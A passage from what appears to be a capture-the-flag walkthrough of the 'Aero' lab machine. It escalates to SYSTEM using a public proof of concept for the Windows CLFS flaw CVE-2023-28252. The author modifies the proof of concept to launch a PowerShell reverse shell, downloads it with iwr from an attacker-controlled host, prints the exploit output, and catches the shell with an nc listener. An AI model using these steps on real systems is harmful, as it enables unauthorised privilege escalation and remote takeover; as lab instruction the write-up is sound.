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xMCAwIG9iago8PC9GMSA5IDAgUgo+PgplbmRvYmoKCjExIDAgb2JqCjw8L0ZvbnQgMTAgMCBSCi9Qcm9jU2V0Wy9QREYvVGV4dF0KPj4KZW5kb2JqCgoxIDAgb2JqCjw8L1R5cGUvUGFnZS9QYXJlbnQgNCAwIFIvUmVzb3VyY2VzIDExIDAgUi9NZWRpYUJveFswIDAgNjEyIDc5Ml0vQ29udGVudHMgMiAwIFI+PgplbmRvYmoKCjQgMCBvYmoKPDwvVHlwZS9QYWdlcwovUmVzb3VyY2VzIDExIDAgUgovTWVkaWFCb3hbIDAgMCA2MTIgNzkyIF0KL0tpZHNbIDEgMCBSIF0KL0NvdW50IDE+PgplbmRvYmoKCjEyIDAgb2JqCjw8L1R5cGUvQ2F0YWxvZy9QYWdlcyA0IDAgUgovT3BlbkFjdGlvblsxIDAgUiAvWFlaIG51bGwgbnVsbCAwXQovTGFuZyhlbi1VUykKPj4KZW5kb2JqCgoxMyAwIG9iago8PC9DcmVhdG9yPEZFRkYwMDU3MDA3MjAwNjkwMDc0MDA2NTAwNzI+Ci9Qcm9kdWNlcjxGRUZGMDA0QzAwNjkwMDYyMDA3MjAwNjUwMDRGMDA2NjAwNjYwMDY5MDA2MzAwNjUwMDIwMDAzNzAwMkUwMDM0PgovQ3JlYXRpb25EYXRlKEQ6MjAyMzA5MjExODE4MTQrMDInMDAnKT4+CmVuZG9iagoKeHJlZgowIDE0CjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAxMzIwNSAwMDAwMCBuIAowMDAwMDAwMDE5IDAwMDAwIG4gCjAwMDAwMDE1NTAgMDAwMDAgbiAKMDAwMDAxMzMwMyAwMDAwMCBuIAowMDAwMDAxNTcxIDAwMDAwIG4gCjAwMDAwMTE5ODcgMDAwMDAgbiAKMDAwMDAxMjAwOSAwMDAwMCBuIAowMDAwMDEyMTk3IDAwMDAwIG4gCjAwMDAwMTI3MzcgMDAwMDAgbiAKMDAwMDAxMzExOCAwMDAwMCBuIAowMDAwMDEzMTUwIDAwMDAwIG4gCjAwMDAwMTM0MDIgMDAwMDAgbiAKMDAwMDAxMzQ5OSAwMDAwMCBuIAp0cmFpbGVyCjw8L1NpemUgMTQvUm9vdCAxMiAwIFIKL0luZm8gMTMgMCBSCi9JRCBbIDw2MjVDNEQ2QjQ3NjREOUI3QzdDQzg0OTg1MTlGQzYxMj4KPDYyNUM0RDZCNDc2NEQ5QjdDN0NDODQ5ODUxOUZDNjEyPiBdCi9Eb2NDaGVja3N1bSAvRjBBQkY4NUJDOEIxQjkxRUYzMkVBNkM5RTUzM0QwMTQKPj4Kc3RhcnR4cmVmCjEzNjc0CiUlRU9GCg==

```

On my VM, I’ll decode that into a file:

```
oxdf@hacky$ echo "JVBERi...[snip]...GCg==" | base64 -d > CVE-2023-28252_Summary.pdf

```

The PDF has information about CVE-2023-28252:

![image-20230926164349274](https://0xdf.gitlab.io/img/image-20230926164349274.png)

#### Patch Level

```
C:\Windows\ImmersiveControlPanel> systeminfo

Host Name:                 AERO
OS Name:                   Microsoft Windows 11 Pro N
OS Version:                10.0.22000 N/A Build 22000
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          sam.emerson
Registered Organization:
Product ID:                00332-00332-83900-AA094
Original Install Date:     9/18/2023, 1:06:55 PM
System Boot Time:          9/26/2023, 4:53:28 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
994 Mhz                    [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 1,988 MB
5,503 MBMemory: Max Size:
Virtual Memory: Available: 3,363 MB
Virtual Memory: In Use:    2,140 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\AERO
Hotfix(s):                 7 Hotfix(s) Installed.
                           [01]: KB5004342
                           [02]: KB5010690
                           [03]: KB5012170
                           [04]: KB5026038
                           [05]: KB5026910
                           [06]: KB5023774
                           [07]: KB5029782
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.11.237
                                 [02]: fe80::278e:36a1:9f1a:30a1
:6c5f:1cd3:c8ca:81f8             [03]: dead:beef:
                                 [04]: dead:beef::4a1f:2e09:f464:b9fe
                                 [05]: dead:beef::247
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

I’ll notice that there are 7 hotfixes applied. The [Microsoft page for CVE-2023-28252](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28252) has links to the “security only” patches for Windows 11 x64 that are labeled KB5025224, which is not on this system.

### CVE-2023-28252

#### POC

Searching for “CVE-2023-28252 POC” finds [this repo from fortra](https://github.com/fortra/CVE-2023-28252). It has a ton of detail about the exploit in the Common Log File System.

The repo has a VS project file, so I’ll clone it to my Windows Machine and open it in Visual Studio. The POC is quite long, but on lines 1491-1502, it checks if it is running as system and then launches `notepad.exe`:

![image-20230926164832525](https://0xdf.gitlab.io/img/image-20230926164832525.png)

I’ll replace `notepad.exe` with PowerShell #3 (Base64) from [revshells.com](https://www.revshells.com/):

![image-20230926164949303](https://0xdf.gitlab.io/img/image-20230926164949303.png)

Now I’ll build it. It’s important to set this as a release build, or else it will require certain libraries that are not on Aero. If I see errors about failing to convert string types like this:

![image-20230926165207728](https://0xdf.gitlab.io/img/image-20230926165207728.png)

I can fix that by going into the project settings (right click on `clfs_eop` in the Solutions Explorer and go to Properties), under Configuration Properties > Advanced set “Character Set” to “Use Multi-Byte Character Set”. Now on “Rebuild Solution”:

![image-20230926165332566](https://0xdf.gitlab.io/img/image-20230926165332566.png)

#### Upload

I’ll host the file using a Python webserver ( `python3 -m http.server 80`) and then request it with PowerShell:

```
PS C:\Users\sam.emerson\documents> iwr http://10.10.14.6/clfs_eop.exe -outfile clfs_eop.exe
PS C:\Users\sam.emerson\documents> ls

    Directory: C:\Users\sam.emerson\documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/26/2023   1:54 PM         139264 clfs_eop.exe
-a----         9/21/2023   9:18 AM          14158 CVE-2023-28252_Summary.pdf
-a----         9/26/2023   1:07 PM            987 watchdog.ps1

```

#### Execute

Now I run the exploit:

```
PS C:\Users\sam.emerson\documents> .\c.exe
[+] Incorrect number of arguments ... using default value 1208 and flag 1 for w11 and w10

ARGUMENTS
[+] TOKEN OFFSET 4b8
[+] FLAG 1

VIRTUAL ADDRESSES AND OFFSETS
[+] NtFsControlFile Address --> 00007FFC413A4240
[+] pool NpAt VirtualAddress -->FFFF838860D94000
[+] MY EPROCESSS FFFF9F0784AE2080
[+] SYSTEM EPROCESSS FFFF9F07844EE040
[+] _ETHREAD ADDRESS FFFF9F0784AE3080
[+] PREVIOUS MODE ADDRESS FFFF9F0784AE32B2
[+] Offset ClfsEarlierLsn --------------------------> 0000000000013220
[+] Offset ClfsMgmtDeregisterManagedClient --------------------------> 000000000002BFB0
[+] Kernel ClfsEarlierLsn --------------------------> FFFFF80430E13220
[+] Kernel ClfsMgmtDeregisterManagedClient --------------------------> FFFFF80430E2BFB0
[+] Offset RtlClearBit --------------------------> 0000000000343010
[+] Offset PoFxProcessorNotification --------------------------> 00000000003DBD00
[+] Offset SeSetAccessStateGenericMapping --------------------------> 00000000009C87B0
[+] Kernel RtlClearBit --------------------------> FFFFF8042E543010
[+] Kernel SeSetAccessStateGenericMapping --------------------------> FFFFF8042EBC87B0

[+] Kernel PoFxProcessorNotification --------------------------> FFFFF8042E5DBD00

PATHS
[+] Folder Public Path = C:\Users\Public
[+] Base log file name path= LOG:C:\Users\Public\21
[+] Base file path = C:\Users\Public\21.blf
[+] Container file name path = C:\Users\Public\.p_21
Last kernel CLFS address = FFFF838861F14000
numero de tags CLFS founded 12

Last kernel CLFS address = FFFF838862203000
numero de tags CLFS founded 1

[+] Log file handle: 0000000000000104
[+] Pool CLFS kernel address: FFFF838862203000

number of pipes created =5000

number of pipes created =4000
TRIGGER START
System_token_value: FFFF83885BA654FF
SYSTEM TOKEN CAPTURED
Closing Handle
ACTUAL USER=SYSTEM
#< CLIXML

```

It hangs here, but at `nc` there’s a shell:

```
PS > nc -lvnp 9001
listening on [any] 9001 ...
Connection received on 10.10.11.237 50621

```

This shell doesn’t show a prompt at first, but when I run a command, it prints the result and then shows a prompt:

```
whoami
nt authority\system
PS C:\users\sam.emerson\Documents>

```

And I’m able to read `root.txt`:

```
PS C:\users\administrator\desktop> type root.txt
7aafc436************************

```

## Beyond Root - watchdog.ps1

